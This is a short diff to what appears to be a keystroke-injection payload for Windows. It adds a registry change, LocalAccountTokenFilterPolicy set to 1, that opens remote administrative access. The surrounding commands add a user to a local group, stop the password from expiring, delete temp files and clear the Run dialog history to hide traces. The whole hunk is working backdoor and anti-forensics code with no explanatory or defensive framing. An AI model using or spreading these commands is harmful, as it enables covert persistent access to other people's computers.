@@ -29,6 +29,7 @@ STRINGLN
                  & NET LOCALGROUP $group $Username /add
                  & WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE
                  reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DisableBackButton /t REG_DWORD /d 0 /f
+                 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
                  rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
                  reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
                  exit
